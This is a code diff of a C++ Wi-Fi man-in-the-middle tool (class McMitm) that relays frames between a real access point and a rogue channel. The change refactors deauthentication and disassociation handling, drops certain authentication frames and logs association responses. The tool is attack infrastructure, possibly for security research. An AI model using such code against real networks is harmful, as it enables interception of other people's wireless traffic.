@@ -55,25 +55,30 @@ FrameProcess McMitm::handle_eapol_real(const HWAddress<6> addr1, const HWAddress
 	return CONTINUE;
 }
 
-void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11, const HWAddress<6> &addr1){
+void McMitm::handle_disconnect_real(const Dot11 &dot11) {
+	if(!dot11.find_pdu<Dot11Deauthentication>() && !dot11.find_pdu<Dot11Disassoc>()) return;
+	client_state.update_state(ClientState::Target_disconnected);
+}
 
+void McMitm::handle_from_ap_real(const Dot11 &dot11, const HWAddress<6> &addr1, const frame_raw_t &raw){
 	// Forward na rogue channel
 	if(client_state.get_mac() == addr1){
 		if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>()){
-			display_traffic(dot11, "Real channel", client_state.get_mac() == addr1 ? " -- MitM'ing" : "");
-			if(client_state.get_state() < ClientState::GotMitm)
-				client_state.update_state(ClientState::Target_disconnected);
-		}
-
-		// Auth(seq=2) from real AP must NOT be forwarded
-		// rogue side already sent a synthetic Auth(seq=2) in handle_open_auth
-		// Forwarding it triggers a second assoc cycle at the real AP
-		// ("Multiple EAP reauth attempts without 4-way handshake completion")
-		if(const auto *auth = dot11.find_pdu<Dot11Authentication>(); auth && auth->auth_seq_number() == 2){
-			log(LogLevel::DEBUG, "Real channel: dropping Auth(seq=2) relay to rogue (synthetic already sent)");
+			display_traffic(dot11, "Real channel", " -- MitM'ing");
+			handle_disconnect_real(dot11);
+			send_to_rogue(raw);
 			return;
 		}
-		send_to_rogue(*pdu);
+
+		// Open-System Auth from real AP: rogue hostapd handles auth/assoc directly - ignore
+		if(const auto *auth = dot11.find_pdu<Dot11Authentication>();
+			auth && auth->auth_seq_number() == 2 && auth->auth_algorithm() == 0){
+			log(LogLevel::DEBUG, "Real channel: dropping Open-System Auth(seq=2) relay to rogue");
+			return;
+		}
+		if(const auto *ar = dot11.find_pdu<Dot11AssocResponse>())
+			log(LogLevel::INFO, "Real channel: AssocResp status={} AID={} -> relay", ar->status_code(), ar->aid());
+		send_to_rogue(raw);
 	}
 }
 
@@ -122,11 +127,9 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const frame_raw_t &
 	if(dot11->addr1() == ap.get(SK::mac)){ // -> AP
 		if(client_state.get_mac() == addr2) display_traffic(*dot11, "Real channel");
 		// STA -> AP
-		if((dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) &&
-			client_state.get_state() < ClientState::GotMitm)
-			client_state.update_state(ClientState::Target_disconnected);
+		handle_disconnect_real(*dot11);
 	} else if(addr2 == ap.get(SK::mac)){ // AP ->
-		handle_from_ap_real(pdu, *dot11, addr1);
+		handle_from_ap_real(*dot11, addr1, raw);
 	}
 }
 }
